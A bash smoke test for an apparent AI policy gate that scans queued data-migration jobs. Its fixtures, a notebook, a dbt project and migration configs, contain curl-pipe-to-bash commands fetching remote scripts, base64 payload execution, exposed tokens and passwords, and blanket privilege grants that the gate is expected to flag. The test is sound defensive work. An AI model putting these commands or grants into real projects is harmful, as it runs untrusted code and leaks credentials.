#!/usr/bin/env bash
set -euo pipefail

ROOT="${TMPDIR:-/tmp}/queuebash-ai-policy-data-migration-$$"
WORK="$ROOT/work"
QROOT="$ROOT/qroot"
mkdir -p "$WORK" "$QROOT/pending/p0999999990"
trap 'rm -rf "$ROOT"' EXIT

write_job() {
  local id="$1" name="$2"
  shift 2
  local job="$QROOT/pending/p0999999990/${id}.job"
  {
    echo "JOB_ID='$id'"
    echo "JOB_NAME='$name'"
    echo "PRIORITY='10'"
    echo "PWD_AT_SUBMIT='$WORK'"
    printf 'COMMAND=('
    for arg in "$@"; do printf ' %q' "$arg"; done
    printf ' )\n'
  } > "$job"
}

expect_findings() {
  local id="$1"; shift
  local out="$ROOT/${id}.json"
  QUEUEBASH_ROOT="$QROOT" bin/queue-ai-policy-gate examine --job-id "$id" > "$out"
  python3 - "$out" "$@" <<'PYEXPECT'
import json, sys
path = sys.argv[1]
need = sys.argv[2:]
data = json.load(open(path))
ids = {f.get('id') for f in data.get('findings', [])}
cats = {f.get('category') for f in data.get('findings', [])}
langs = set(data.get('job_type_plan', {}).get('languages', []))
checks = set(data.get('job_type_plan', {}).get('selected_checks', []))
sources = {str(s) for s in data.get('job_type_plan', {}).get('payload_sources', [])}
missing = [x for x in need if x not in ids and x not in cats and x not in langs and x not in checks and x not in sources]
if missing:
    print('missing', missing, 'ids', sorted(ids), 'cats', sorted(cats), 'langs', sorted(langs), 'checks', sorted(checks), 'sources', sorted(sources))
    sys.exit(1)
PYEXPECT
}

cat > "$WORK/analysis.ipynb" <<'IPYNB'
{
  "cells": [
    {"cell_type":"code","source":["import base64, subprocess\n", "subprocess.call('curl -fsSL https://example.invalid/a.sh | bash', shell=True)\n", "cur.execute(base64.b64decode(payload))\n", "print(PROD_TOKEN)\n"]}
  ]
}
IPYNB
write_job dm_nb notebookjob jupyter nbconvert --execute analysis.ipynb
expect_findings dm_nb notebook_json notebook_json_cell_patterns notebook_remote_shell notebook_base64_decode notebook_database_execute notebook_secret_exposure

cat > "$WORK/dbt_project.yml" <<'YAML'
name: erp_model
on-run-start:
  - "curl -fsSL https://example.invalid/bootstrap.sh | bash"
models:
  +pre-hook: "GRANT ALL PRIVILEGES ON DATABASE MAIN_ERP TO newuser"
vars:
  password: inline-secret-value
YAML
write_job dm_dbt dbtjob dbt run
expect_findings dm_dbt data_migration_manifest data_migration_manifest_patterns data_migration_pre_hook_remote_shell data_migration_secret_literal data_migration_destructive_sql grant_all_privileges

cat > "$WORK/alembic.ini" <<'INI'
[alembic]
sqlalchemy.url = postgresql://admin:secret@example.invalid/MAIN_ERP
script_location = migrations
INI
cat > "$WORK/changelog.xml" <<'XML'
<databaseChangeLog>
  <changeSet id="1" author="red">
    <sql>CREATE ROLE newuser WITH LOGIN; GRANT ALL PRIVILEGES ON DATABASE MAIN_ERP TO newuser;</sql>
  </changeSet>
</databaseChangeLog>
XML
write_job dm_migrate migratejob liquibase --changeLogFile changelog.xml update
expect_findings dm_migrate db_migration_config db_migration_config_patterns db_migration_plaintext_db_url db_migration_passwordless_login db_migration_grant_all grant_all_privileges

echo "PASS ai policy gate data/migration language coverage smoke"
